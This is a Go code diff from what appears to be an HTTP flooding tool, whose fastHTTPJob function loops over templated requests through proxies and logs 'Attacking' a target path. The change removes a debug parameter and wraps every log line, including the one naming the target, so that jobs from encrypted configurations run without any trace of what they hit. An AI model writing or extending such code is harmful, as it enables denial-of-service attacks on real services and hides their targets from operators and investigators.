@@ -21,21 +21,25 @@ type httpJobConfig struct {
 	Client  map[string]interface{} // See HTTPClientConfig
 }
 
-func singleRequestJob(ctx context.Context, globalConfig GlobalConfig, args Args, debug bool) (data interface{}, err error) {
+func singleRequestJob(ctx context.Context, globalConfig GlobalConfig, args Args) (data interface{}, err error) {
 	ctx, cancel := context.WithCancel(ctx)
 	defer cancel()
 	defer utils.PanicHandler()
 
 	var jobConfig httpJobConfig
 	if err := utils.Decode(args, &jobConfig); err != nil {
-		log.Printf("Error parsing job config: %v", err)
+		if !isInEncryptedContext(ctx) {
+			log.Printf("Error parsing job config: %v", err)
+		}
 
 		return nil, err
 	}
 
 	var clientConfig http.ClientConfig
 	if err := utils.Decode(templates.ParseAndExecuteMapStruct(jobConfig.Client, ctx), &clientConfig); err != nil {
-		log.Printf("Error parsing client config: %v", err)
+		if !isInEncryptedContext(ctx) {
+			log.Printf("Error parsing client config: %v", err)
+		}
 
 		return nil, err
 	}
@@ -44,11 +48,13 @@ func singleRequestJob(ctx context.Context, globalConfig GlobalConfig, args Args,
 		clientConfig.ProxyURLs = globalConfig.ProxyURL
 	}
 
-	client := http.NewClient(clientConfig, debug)
+	client := http.NewClient(clientConfig, globalConfig.Debug)
 
 	var requestConfig http.RequestConfig
 	if err := utils.Decode(templates.ParseAndExecuteMapStruct(jobConfig.Request, ctx), &requestConfig); err != nil {
-		log.Printf("Error parsing request config: %v", err)
+		if !isInEncryptedContext(ctx) {
+			log.Printf("Error parsing request config: %v", err)
+		}
 
 		return nil, err
 	}
@@ -59,12 +65,15 @@ func singleRequestJob(ctx context.Context, globalConfig GlobalConfig, args Args,
 	resp := fasthttp.AcquireResponse()
 	defer fasthttp.ReleaseResponse(resp)
 
-	log.Printf("Sent single http request to %v", requestConfig.Path)
+	if !isInEncryptedContext(ctx) {
+		log.Printf("Sent single http request to %v", requestConfig.Path)
+	}
+
 	dataSize := http.InitRequest(requestConfig, req)
 
 	metrics.Default.Write(metrics.Traffic, uuid.New().String(), uint64(dataSize))
 
-	if err = sendFastHTTPRequest(client, req, resp, debug); err == nil {
+	if err = sendFastHTTPRequest(client, req, resp); err == nil {
 		metrics.Default.Write(metrics.ProcessedTraffic, uuid.New().String(), uint64(dataSize))
 	}
 
@@ -83,7 +92,7 @@ func singleRequestJob(ctx context.Context, globalConfig GlobalConfig, args Args,
 		}
 
 		if expire := c.Expire(); expire != fasthttp.CookieExpireUnlimited && expire.Before(time.Now()) {
-			if debug {
+			if globalConfig.Debug && !isInEncryptedContext(ctx) {
 				log.Println("cookie from request expired:", string(key))
 			}
 
@@ -103,21 +112,25 @@ func singleRequestJob(ctx context.Context, globalConfig GlobalConfig, args Args,
 	}, nil
 }
 
-func fastHTTPJob(ctx context.Context, globalConfig GlobalConfig, args Args, debug bool) (data interface{}, err error) {
+func fastHTTPJob(ctx context.Context, globalConfig GlobalConfig, args Args) (data interface{}, err error) {
 	ctx, cancel := context.WithCancel(ctx)
 	defer cancel()
 	defer utils.PanicHandler()
 
 	var jobConfig httpJobConfig
 	if err := utils.Decode(args, &jobConfig); err != nil {
-		log.Printf("Error parsing job config: %v", err)
+		if !isInEncryptedContext(ctx) {
+			log.Printf("Error parsing job config: %v", err)
+		}
 
 		return nil, err
 	}
 
 	var clientConfig http.ClientConfig
 	if err := utils.Decode(templates.ParseAndExecuteMapStruct(jobConfig.Client, ctx), &clientConfig); err != nil {
-		log.Printf("Error parsing client config: %v", err)
+		if !isInEncryptedContext(ctx) {
+			log.Printf("Error parsing client config: %v", err)
+		}
 
 		return nil, err
 	}
@@ -126,11 +139,13 @@ func fastHTTPJob(ctx context.Context, globalConfig GlobalConfig, args Args, debu
 		clientConfig.ProxyURLs = globalConfig.ProxyURL
 	}
 
-	client := http.NewClient(clientConfig, debug)
+	client := http.NewClient(clientConfig, globalConfig.Debug)
 
 	requestTpl, err := templates.ParseMapStruct(jobConfig.Request)
 	if err != nil {
-		log.Printf("Error parsing request config: %v", err)
+		if !isInEncryptedContext(ctx) {
+			log.Printf("Error parsing request config: %v", err)
+		}
 
 		return nil, err
 	}
@@ -144,12 +159,16 @@ func fastHTTPJob(ctx context.Context, globalConfig GlobalConfig, args Args, debu
 	req := fasthttp.AcquireRequest()
 	defer fasthttp.ReleaseRequest(req)
 
-	log.Printf("Attacking %v", jobConfig.Request["path"])
+	if !isInEncryptedContext(ctx) {
+		log.Printf("Attacking %v", jobConfig.Request["path"])
+	}
 
 	for jobConfig.Next(ctx) {
 		var requestConfig http.RequestConfig
 		if err := utils.Decode(requestTpl.Execute(ctx), &requestConfig); err != nil {
-			log.Printf("Error executing request template: %v", err)
+			if !isInEncryptedContext(ctx) {
+				log.Printf("Error executing request template: %v", err)
+			}
 
 			return nil, err
 		}
@@ -158,8 +177,8 @@ func fastHTTPJob(ctx context.Context, globalConfig GlobalConfig, args Args, debu
 
 		trafficMonitor.Add(uint64(dataSize))
 
-		if err := sendFastHTTPRequest(client, req, nil, debug); err != nil {
-			if debug {
+		if err := sendFastHTTPRequest(client, req, nil); err != nil {
+			if globalConfig.Debug && !isInEncryptedContext(ctx) {
 				log.Printf("Error sending request %v: %v", req, err)
 			}
 		} else {
@@ -170,11 +189,7 @@ func fastHTTPJob(ctx context.Context, globalConfig GlobalConfig, args Args, debu
 	return nil, nil
 }
 
-func sendFastHTTPRequest(client *fasthttp.Client, req *fasthttp.Request, resp *fasthttp.Response, debug bool) error {
-	if debug {
-		log.Printf("%s %s started at %d", string(req.Header.Method()), string(req.RequestURI()), time.Now().Unix())
-	}
-
+func sendFastHTTPRequest(client *fasthttp.Client, req *fasthttp.Request, resp *fasthttp.Response) error {
 	if err := client.Do(req, resp); err != nil {
 		metrics.IncHTTP(string(req.Host()), string(req.Header.Method()), metrics.StatusFail)
 
